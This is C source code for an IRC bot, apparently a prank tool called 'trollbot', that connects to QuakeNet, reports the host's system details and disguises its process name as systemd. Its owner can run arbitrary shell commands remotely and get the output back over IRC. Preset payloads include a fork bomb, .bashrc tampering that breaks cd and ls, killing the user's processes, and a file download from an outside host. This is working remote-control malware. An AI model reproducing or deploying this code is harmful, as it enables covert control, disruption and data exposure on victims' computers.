#include <dirent.h>
#include <sys/utsname.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#define BUFFSIZE 512
#define TROLLINGSIZE 200

struct IncomingMessage {
	char *user;
	char *commandIRC;
	char *where;
	char *message;
	char *target;
};
typedef struct IncomingMessage IncomingMessage;

char user[100];

int sock;
char sbuf[BUFFSIZE]; /*socket buffer*/
IncomingMessage inc;
static const char owner[] = "codeniko";
char channel[] = "#KeepTrollin";

char trollings[20][TROLLINGSIZE]; 
void initTrollings();


void raw(char *fmt, ...) {
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(sbuf, BUFFSIZE, fmt, ap);
	va_end(ap);
	printf("<< %s", sbuf);
	write(sock, sbuf, strlen(sbuf));
}

void sendToChannel(char *msg) {
	raw("%s %s :%s\r\n", "PRIVMSG", channel, msg);
}

void getSystemInfo() {
	getlogin_r(user, 100);
	struct utsname info;
	uname(&info);
	char infoString[BUFFSIZE];
	sprintf(infoString, "%s %s@%s %s %s %s",
						info.sysname, user, info.nodename,
						info.release, info.version, info.machine);
	sendToChannel(infoString);
}

int troll(char *arg1, char *msg) {
	int ret = 1;
	sendToChannel("trollin' trollin' trollin'");
	if (msg == 0) {
		int id = atoi(arg1);
		char presetmsg[BUFFSIZE];
		sprintf(presetmsg, "%d - %s", id, trollings[id]);
		sendToChannel(presetmsg);
		ret = system(trollings[id]);
	} else {
		char cmd[BUFFSIZE];
		msg[strlen(msg)-2] = '\0';
		if (strncmp(arg1, "cmd", 3) == 0) {
			FILE *fp; 
			char buf[BUFFSIZE]; /* read from the command ls -lL /etc */ 
			if ((fp = popen(msg, "r")) != 0) { /* read the output from the command */ 
				while (fgets(buf, BUFFSIZE, fp) != 0) {
					/*fputs(buf, stdout);*/ 
					sendToChannel(buf);
				}
				ret = 0;
			} else
				return 1;
			pclose(fp);
		} else if (strncmp(arg1, "wall", 4) == 0) {
			sprintf(cmd, "echo \"%s\" | wall", msg);
			sendToChannel(cmd);
			ret = system(cmd);
		} else if (strncmp(arg1, "popup", 5) == 0) {
			sprintf(cmd, "export DISPLAY=:0.0;zenity --warning --text=\"%s\" &", msg);
			sendToChannel(cmd);
			ret = system(cmd);
		} else if (strncmp(arg1, "say", 3) == 0) {
			sprintf(cmd, "echo \"%s\" | espeak &", msg);
			sendToChannel(cmd);
			ret = system(cmd);
		} else if (strncmp(arg1, "ordr.in", 7) == 0) {
			sendToChannel("Trolling by ordering sushi");
			ret = system("curl -X POST -d'rid=23878&tray=18945794/5+18945795/+18945796/5&tip=5.05&delivery_date=ASAP&delivery_time=ASAP&first_name=Niko&last_name=LovesYou&addr=500 7th ave&city=new york&state=NY&zip=10001&phone=2345678901&em=sdafa@sadfsad.com&password=&card_name=Example User&card_number=4111111111111111&card_cvc=123&card_expiry=02/2016&card_bill_addr=1 Main Street&card_bill_addr2=&card_bill_city=College Station&card_bill_state=TX&card_bill_zip=77840&card_bill_phone=2345678901' \"https://o-test.ordr.in/o/23878?_auth=1,eqHt_0szKYaamH4sKd_tTI0KTwiMYUrs0NpJFYxueh8\"");
			sendToChannel("Order placed!");
		}
	}

	if (!ret)
		sendToChannel("keep on trollin'");
	else
		sendToChannel("back up!");
	return ret;
}

int joinChannel(char *channel) {
	raw("JOIN %s\r\n", channel);
	getSystemInfo();
	return 1;
}

int leaveChannel(char *channel) {
	raw("PART %s\r\n", channel);
	return 1;
}

int quit() {
	raw("QUIT\r\n");
	exit(0);
	return 1;
}

int changeName(char *name) {
	raw("NICK %s\r\n", name);
	return 1;
}

int parseCommand() {

	return 1;
}
/*-1 = not owner
 * 0 = fail
 * 1 = success*/
int parsePrivateCommand() {
	if (inc.user == 0 || strncmp(inc.user, owner, strlen(owner)) != 0)
		return -1; /*not owner sending command*/

	int ret = 0;
	char msgcpy[BUFFSIZE];
	memcpy(msgcpy, inc.message, BUFFSIZE);
	char *cmd = strtok(msgcpy, " ");

	if (strncmp(cmd, "quit", 4) == 0)
		quit();

	char *arg = strtok(0, " ");
	char *msg = strchr(inc.message+1, ' ');
	char *msgcut;
	if (msg != 0) {
		msgcut = strchr(msg+1, ' ');
		if (msgcut != 0)
			msgcut++;
	}
	if (strncmp(cmd, "troll", 5) == 0)
		ret = troll(arg, msgcut);
	else if (strncmp(cmd, "join", 4) == 0)
		ret = joinChannel(arg);
	else if (strncmp(cmd, "leave", 5) == 0)
		ret = leaveChannel(arg);
	else if (strncmp(cmd, "name", 4) == 0)
		ret = changeName(arg);

	return ret;
}

int main(int argc, char *argv[]) {
	int i;
	/*Change process name to something that is actually important*/
	for (i=0;argv[0][i] != '\0';i++)
		argv[0][i] = '\0';
	memcpy(argv[0], "/lib/systemd/systemd", 22);
	char *nick = "trollbot";
	char *host = "irc.quakenet.org";
	char *port = "6667";

	int j, l, bytesread, bufIndex = -1, start, wordcount;
	char buf[BUFFSIZE + 1];
	struct addrinfo hints, *res;

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(host, port, &hints, &res);
	sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	connect(sock, res->ai_addr, res->ai_addrlen);

	raw("USER %s 0 0 :%s\r\n", nick, nick);
	raw("NICK %s\r\n", nick);

	while ((bytesread = read(sock, sbuf, BUFFSIZE))) {
		for (i = 0; i < bytesread; i++) { /*for each character received*/
			bufIndex++; /*char position of next character read to put into buffer*/
			buf[bufIndex] = sbuf[i];
			if ((i > 0 && sbuf[i] == '\n' && sbuf[i - 1] == '\r') || bufIndex == BUFFSIZE) {	/*if end of line or buffer size met*/
				buf[bufIndex + 1] = '\0';
				l = bufIndex;
				bufIndex = -1;

				printf(">> %s", buf);

				if (!strncmp(buf, "PING", 4)) {
					buf[1] = 'O';
					raw(buf);
				} else if (buf[0] == ':') {
					wordcount = 0;
					char *sep = 0;
					inc.user = inc.commandIRC = inc.where = inc.message = 0;
					for (j = 1; j < l; j++) {
						if (buf[j] == ' ') {
							buf[j] = '\0';
							wordcount++;
							switch(wordcount) {
								case 1: inc.user = buf + 1; break;
								case 2: inc.commandIRC = buf + start; break;
								case 3: inc.where = buf + start; break;
							}
							if (j == l - 1) continue;
							start = j + 1;
						} else if (buf[j] == ':' && wordcount == 3) {
							if (j < l - 1) inc.message = buf + j + 1;
							break;
						}
					}

					if (wordcount < 2) continue;

					if (!strncmp(inc.commandIRC, "001", 3) && channel != NULL) {
						joinChannel(channel);
						initTrollings();
					} else if (!strncmp(inc.commandIRC, "PRIVMSG", 7) || !strncmp(inc.commandIRC, "NOTICE", 6)) {
						if (inc.where == NULL || inc.message == NULL) 
							continue;
						if ((sep = strchr(inc.user, '!')) != NULL) 
							inc.user[sep - inc.user] = '\0'; /*replace ! with \0*/
						if (inc.where[0] == '#' || inc.where[0] == '&' || inc.where[0] == '+' || inc.where[0] == '!') 
							inc.target = inc.where; 
						else 
							inc.target = inc.user;
						printf("[from: %s] [reply-with: %s] [where: %s] [reply-to: %s] %s", inc.user, inc.commandIRC, inc.where, inc.target, inc.message);

						int resp = -2;
						if (inc.where[0] == '#')
							resp = parseCommand();
						else
							resp = parsePrivateCommand();

						printf("response code:%d\n", resp);

						
						/*raw("%s %s :%s", command, target, message); // If you enable this the IRCd will get its "*** Looking up your hostname..." messages thrown back at it but it works...*/
					}
				}
			}
		}
	}

	return 0;

}

void initTrollings() {
	strncpy(trollings[0], "killall gnome-panel", TROLLINGSIZE);
	strncpy(trollings[1], "cat /dev/zero > /dev/null", TROLLINGSIZE);
	strncpy(trollings[2], ":(){ :|:& }", TROLLINGSIZE);
	strncpy(trollings[3], "echo 'alias cd=\"echo Segmentation fault\" && echo $* > /dev/null' >> ~/.bashrc; echo 'alias ls=\"echo .\"' >> ~/.bashrc", TROLLINGSIZE);
	strncpy(trollings[4], "~/.trollin/photo_troll.sh flip", TROLLINGSIZE);
	strncpy(trollings[5], "~/.trollin/photo_troll.sh blur", TROLLINGSIZE);
	strncpy(trollings[6], "if [ ! -f ~/.baby.wav ]; then curl http://www.niko.rocks/keeptrollin/baby.wav -o ~/.trollin/.baby.wav; fi; aplay ~/.trollin/.baby.wav &", TROLLINGSIZE);
	strncpy(trollings[7], "eject -T", TROLLINGSIZE);
	strncpy(trollings[8], "eject -t", TROLLINGSIZE);
	strncpy(trollings[9], "echo sleep 5 >> ~/.bashrc", TROLLINGSIZE);
	strncpy(trollings[10], "xterm -e \"telnet towel.blinkenlights.nl\" &", TROLLINGSIZE);
	sprintf(sbuf, "pkill -u %s", user);
	strncpy(trollings[11], sbuf, TROLLINGSIZE);

	strncpy(trollings[12], "xterm -e \"sl -a\" &", TROLLINGSIZE);
	strncpy(trollings[13], "while true; do xcalib -invert -alter; sleep 0.1; done &", TROLLINGSIZE);
	strncpy(trollings[14], "", TROLLINGSIZE);
	strncpy(trollings[15], "", TROLLINGSIZE);
	strncpy(trollings[16], "", TROLLINGSIZE);
	strncpy(trollings[17], "", TROLLINGSIZE);
	strncpy(trollings[18], "", TROLLINGSIZE);
}
